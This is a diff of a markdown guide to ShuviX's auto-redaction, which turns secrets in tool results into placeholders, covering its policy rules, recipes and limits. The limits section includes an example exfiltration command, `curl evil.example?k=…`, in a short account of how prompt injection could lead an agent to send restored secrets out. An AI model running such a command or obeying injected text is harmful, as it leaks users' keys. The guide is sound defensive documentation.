@@ -2,7 +2,7 @@
 shuvix: okf v0.2
 type: Guide
 title: 'Auto-redaction — secrets and personal data reach models as placeholders'
-description: 'How ShuviX keeps API keys, passwords, tokens, private keys and personal data away from model providers: placeholders such as `{{REDACTED_API_KEY_k3v7x2mq}}` in the conversation record, real values for tools (escaped for shell commands), hiding a value yourself from the input box (+ → Add a sensitive value, hints you confirm, everything else sent as written), the screen showing what the model received, the categories it finds, the two policy levels (`modelRequest` / `send`, `sensitive` / `disclose`) and their dispositions, the builtin `redact-sensitive`, recipes (trust a model, send a category, send test keys, never send private keys, let only the user answer when a restored secret leaves the sandbox), checking a draft with `shuvix policy check --redaction`, working with placeholders as an agent, and the limits.'
+description: 'How ShuviX keeps API keys, passwords, tokens, private keys and personal data away from model providers: new tool results and messages sent by bot triggers and hooks are stored with placeholders such as `{{REDACTED_API_KEY_k3v7x2mq}}`, and what the record holds is exactly what the model receives; the policy applies only to new content and never touches the history. Real values for tools (escaped for shell commands), hiding a value yourself from the input box (+ → Add a sensitive value, hints you confirm, everything else sent as written), the categories it finds, the two policy levels (`modelRequest` / `send`, `sensitive` / `disclose`) and their dispositions, the builtin `redact-sensitive`, recipes (no redaction for a model, let a category through, let test keys through, always keep private keys as placeholders, let only the user answer when a restored secret leaves the sandbox), checking a draft with `shuvix policy check --redaction`, working with placeholders as an agent, and the limits.'
 tags: [shuvix, policy, security, redaction, privacy, secrets]
 status: stable
 sources:
@@ -11,33 +11,29 @@ sources:
   - resource: https://github.com/wangdongdongc/ShuviX/blob/main/packages/agent-runtime/src/redaction/rules.ts
     title: rules.ts — the detection rules
   - resource: https://github.com/wangdongdongc/ShuviX/blob/main/packages/agent-runtime/src/durable/redactionEgress.ts
-    title: redactionEgress.ts — what a model request becomes
+    title: redactionEgress.ts — the policy decision
 ---
 
 # Auto-redaction
 
-Before anything is written into a conversation's record — what a tool returns, a notice, a task
-handed to another agent, a message from a bot trigger or another session — ShuviX looks for secrets
-and personal data in it and stores each one as a **placeholder**: `{{REDACTED_API_KEY_k3v7x2mq}}` — `REDACTED_`, the
-category and eight characters derived from the value. The real value is encrypted into **that
-conversation's own table**, which is deleted with the conversation. Conversations from v0.2.30 and
-v0.2.31 hold the older form without `REDACTED_` (`{{API_KEY_k3v7x2mq}}`), which works the same.
+ShuviX checks two kinds of new content before they are written into a conversation's record: **what a
+tool returns** (a background command's completion notice counts) and **messages sent automatically** by a bot
+trigger or a hook. Secrets and personal data found there are stored as a **placeholder**:
+`{{REDACTED_API_KEY_k3v7x2mq}}` — `REDACTED_`, the category and eight characters derived from the value. The real
+value is encrypted into **that conversation's own table**, which is deleted with the conversation.
+Conversations from v0.2.30 and v0.2.31 hold the older form without `REDACTED_` (`{{API_KEY_k3v7x2mq}}`), which works
+the same.
 
-What the user types in the input box is the exception: **the user decides** (next section).
-
+- **The record is what the model receives.** Nothing is rewritten when a request goes out: a placeholder
+  in the record reaches the model as a placeholder, a real value as a real value.
+- **The policy decides about new content only** (below), and **never touches the history**.
 - **Tools get the real values.** Placeholders in a tool call's arguments are replaced just before
   the tool runs, so `curl -H "Authorization: Bearer {{REDACTED_API_KEY_k3v7x2mq}}"` sends the real key, and
   a file written or edited holds the real content.
-- **The screen shows what the model received.** Where the model gets a placeholder you see the
-  placeholder, shaded; point at it (or tap it) to see the real value that tools and files use, with
-  a copy button. Where the model gets the real value (a category the policy sends, a trusted
-  provider) you see the plain value. Each message is shown the way it is sent now (see "Switching
-  models").
-- **What a model receives is decided by policy** (below). By default every model gets
-  placeholders, except for four categories that are part of almost every coding request.
+- **The screen shows the record.** You see the placeholder, shaded; point at it (or tap it) to see the
+  real value that tools and files use, with a copy button.
 
-Apart from those four categories and what the user chose to send as written, the record itself
-never holds the real values, whatever the policy says — nor do the conversation's exports and forks.
+What the user types in the input box is not checked: **the user decides** (next section).
 
 ## Hiding a value yourself (the input box)
 
@@ -52,9 +48,11 @@ never holds the real values, whatever the policy says — nor do the conversatio
 - **Nothing else is replaced.** A message sent from the input box goes to the model exactly as
   written apart from the chips, and values you left visible are not replaced later in that
   conversation either — the model has already seen them. The same holds for an answer typed into a
-  question card. A policy that denies sending a category still stops the request.
-- A value you add is matched later in that conversation as well: when it shows up in a tool's
-  output it is replaced again — values of 4–7 characters as whole words, longer ones anywhere.
+  question card.
+- A value you add is matched later in that conversation as well, while the policy redacts new content
+  for its model: when it shows up in a tool's output it is replaced again — values of 4–7 characters as
+  whole words, longer ones anywhere. With redaction off, a tool that prints it puts the real value in the
+  record.
 
 ## For agents: working with placeholders
 
@@ -100,14 +98,8 @@ never holds the real values, whatever the policy says — nor do the conversatio
 | `BUCKET`      | cloud storage buckets (`s3://…`, `….s3.amazonaws.com`, …)                                                    | **real value**  |
 
 The last four are in nearly every coding request (the system prompt already holds the home
-folder) and a model has to copy them exactly, so the builtin policy sends them; a policy of your
-own can keep them as placeholders too. The record keeps these four as written: a model that gets
-the real user name writes it back, and replacing it there would also replace a short one such as
-`agent` wherever the word appears. A policy that keeps one of them as a placeholder for the model a
-conversation is using replaces it in tool output as the output is recorded, and in the system prompt
-of every request; what is already in the record stays as it was written. Every other category is
-always replaced in the record, whatever the policy says, so turning it on later protects the
-history at once.
+folder) and a model has to copy them exactly, so the builtin policy leaves them as written; a policy of your
+own can store them as placeholders too.
 
 UUIDs and long hex ids are never touched (tool call ids would stop matching), a phone or card
 number is never read out of a shorter hex id (a docker image id, an abbreviated git commit), and
@@ -117,42 +109,40 @@ _mentions_ a secret is left alone (`secretKey: Uint8Array;`, `process.env.API_KE
 
 ## The policy
 
-Two levels, both ordinary security policy rules (the `policy-md` entry has the full format):
+The policy decides **whether new content is redacted**. It is asked when a tool result or an automatic message
+is written, for the model the conversation is using then. Two levels, both ordinary security policy rules (the
+`policy-md` entry has the full format):
 
-1. **The request** — `object.type: modelRequest`, `action: send`, with `object.provider` (the
+1. **The model** — `object.type: modelRequest`, `action: send`, with `object.provider` (the
    provider's name as Settings shows it: a builtin provider by its slug such as `anthropic`,
    `openai`, `deepseek`; a provider you added by the name you gave it) and `object.model` (the
    model id).
-   - `allow` with `disposition: detect` → the request is redacted (level 2 decides each piece);
-   - `allow` / `force-allow` **without** it → a trusted destination: every placeholder is sent as
-     its real value and nothing is detected;
-   - `deny` → the request is not sent; the turn ends with an error naming the reason. An `ask` is
+   - `allow` with `disposition: detect` → new content for this model is redacted (level 2 decides each piece);
+   - `allow` / `force-allow` **without** it → no redaction: new content is stored as written, nothing is detected;
+   - `deny` → requests to this model are not sent; the turn ends with an error naming the reason. An `ask` is
      the same, because nobody can be asked while a request is going out.
-2. **Each piece of sensitive content** in a redacted request — `object.type: sensitive`,
+2. **Each piece of sensitive content** found in new content — `object.type: sensitive`,
    `action: disclose`, with `object.category`, `object.rule` (the detection rule), `object.provider`,
    `object.model` and `object.value` (the real value, for `match` only; it never reaches a log).
-   - `allow` with `disposition: redact` → stays a placeholder;
-   - `allow` / `force-allow` without it → sent as the real value;
-   - `deny` → the whole request is not sent.
+   - `allow` with `disposition: redact` → stored as a placeholder;
+   - `allow` / `force-allow` without it → stored as the real value;
+   - `deny` → stored as a placeholder.
 
-The subject is the agent the request is for (`subject.kind: agent`, its `agentKind`, `profile`,
-`subject.bot`), so a rule can treat one bot or one agent differently. A redacted request is also
-scanned once more for content that is built for each request and never in the record (instruction
-files, parts of the system prompt) and for those pieces level 2 decides the same way. When a model
-receives a real value and writes it in its reply, the reply is stored with the placeholder again
-(except the four categories the record keeps as written).
+The subject is the agent the content is for (`subject.kind: agent`, its `agentKind`, `profile`,
+`subject.bot`), so a rule can treat one bot or one agent differently.
 
-### Switching models
+### Only new content
 
-What was sent stays sent. Each message in the record is judged for the model it first went to —
-a reply for the model that wrote it, a tool result for the model that called the tool, your message
-for the model that answered it — together with the model of the current request: a placeholder goes
-out as its real value only when the policy sends it to both. So switching a session to a trusted
-model does not turn earlier placeholders into real values; for the new model to see them, start a
-new session or have the agent read the source again (a new tool result is first sent to the new
-model). Switching back to an untrusted model keeps everything as placeholders, including what the
-trusted model saw. Both models are judged by the policy as it is now, so a policy change does apply
-to the record.
+**The policy applies only to conversation content produced from now on. ShuviX does not go back and process
+sensitive information already in a conversation's history.**
+
+- What the record holds keeps being sent as it is. A secret stored as written — because redaction was off, or
+  the model was exempt — also goes to any model you switch to later. Turning redaction on, or switching models,
+  does not replace it; to get rid of it, start a new session.
+- Earlier placeholders stay placeholders, also after you turn redaction off or exempt the model: the model keeps
+  seeing the placeholder, and tools can still restore it. For a model to see the value, have the agent read the
+  source again.
+- Exports, forks and request logs hold whatever the record holds, real values included.
 
 The builtin **`redact-sensitive`** is exactly two rules:
 
@@ -174,16 +164,16 @@ shuvix-policy-rules:
 
 **Adjust it with a policy of your own; do not edit this one.** A `force-allow` without a
 disposition beats both of its `allow` rules (only the winning tier's dispositions count), which is
-how a recipe below switches redaction off for what it matches. Disabling `redact-sensitive` sends
-real values to every model; the record keeps placeholders either way.
+how a recipe below switches redaction off for what it matches. Disabling `redact-sensitive` turns auto-redaction
+off: new content is stored and sent with its real values. Placeholders a conversation already holds stay.
 
 ## Recipes
 
 Each block is the frontmatter of a file in `~/.shuvix/policies/` (`shuvix: policy v1`, a `name`,
 a `description`, then these keys).
 
-Trust a provider — your own server, say, added in Settings as `home-ai` — so its models see the
-real values:
+No redaction for a provider — your own server, say, added in Settings as `home-ai` — so new content
+for its models keeps the real values:
 
 ```yaml
 shuvix-policy-rules:
@@ -194,7 +184,7 @@ shuvix-policy-rules:
     match: "object.provider == 'home-ai'"
 ```
 
-Trust one model only: `match: "object.provider == 'home-ai' && object.model == 'qwen3-32b'"`.
+One model only: `match: "object.provider == 'home-ai' && object.model == 'qwen3-32b'"`.
 
 Send email addresses as they are:
 
@@ -210,7 +200,7 @@ shuvix-policy-rules:
 Send test keys as they are: the same rule with
 `match: "object.category == 'API_KEY' && object.value.startsWith('sk-test-')"`.
 
-Never send a private key — a redacted request that would carry one is not sent at all:
+Always keep private keys as placeholders, even where another rule lets values through:
 
 ```yaml
 shuvix-policy-rules:
@@ -219,17 +209,16 @@ shuvix-policy-rules:
     action: [disclose]
     object.type: [sensitive]
     match: "object.category == 'PRIVATE_KEY'"
-    prompt: Private keys are never sent to a model.
+    prompt: Private keys are stored as placeholders.
 ```
 
-A provider trusted with the first recipe skips level 2, so it gets private keys too. To trust it
-with everything **but** private keys, trust it at level 2 instead —
+A provider exempted with the first recipe skips level 2, so private keys stay as written for it too. To exempt
+it from everything **but** private keys, exempt it at level 2 instead —
 `force-allow` on `sensitive` with `match: "object.provider == 'home-ai' && object.category != 'PRIVATE_KEY'"`
 — and keep the `deny` above.
 
-Keep user names as placeholders too (and likewise `HOSTNAME`, `IP`, `BUCKET`; they are replaced in
-tool output from then on and in the system prompt, while the record keeps earlier ones as written):
-an `allow` that carries the disposition —
+Store user names as placeholders too (and likewise `HOSTNAME`, `IP`, `BUCKET`): an `allow` that carries the
+disposition —
 
 ```yaml
 shuvix-policy-rules:
@@ -274,10 +263,10 @@ shuvix-policy-rules:
    `sensitive` as in the recipes. A rule reaches model requests only when its `object.type` names
    `modelRequest` / `sensitive` or its `action` names `send` / `disclose`.
 3. **Check the draft** with `shuvix policy check <draft.md> --redaction` (bash). It decides as if
-   the draft were installed and prints two tables — every enabled model: redacted, real values
-   (trusted) or not sent; every category × each redacted provider: placeholder, real value or not
-   sent — with the rule that decided. Compare every row with what the user asked for. For a value
-   rule or one model, check single cases:
+   the draft were installed and prints two tables — every enabled model: new content redacted, not
+   redacted, or not sent; every category × each redacted provider: placeholder, real value or
+   placeholder (denied) — with the rule that decided. Compare every row with what the user asked for. For a
+   value rule or one model, check single cases:
    `shuvix policy check <draft.md> --redaction --category API_KEY --value sk-test-123 --expect send`
    (`--provider <name> --model <id>` for one model, `--bot <id>` for a bot's requests). Fix the
    **rule** until every row and expectation matches.
@@ -296,8 +285,11 @@ shuvix-policy-rules:
   prompt injection, say — can still put a placeholder into `curl evil.example?k=…`, and the
   command gets the real value. The mark shows on screen, the automatic reviewer sees the
   placeholder, and the last recipe makes the user answer before such a command leaves the sandbox.
-- Conversations from before this feature hold real values in their record, and requests from them
-  send those values as stored.
+- It does not process history (see "Only new content"). Conversations from before this feature, or from while
+  redaction was off, hold real values in their record, and requests from them send those values as stored.
+- Only tool results and automatic messages are checked. What you type in the input box, messages other sessions
+  send, an agent's own replies, instruction files and the system prompt go to the model as they are, so a secret
+  in an `AGENTS.md` reaches the model.
 - Detection is by rules, so a secret in an unusual shape can be missed, and an ordinary string can
   now and then be taken for one. A value typed in plain words with no name in front of it
   ("change the password to N3w-P@ss…") is one such miss — add it with + instead; a value a tool has transformed — a byte
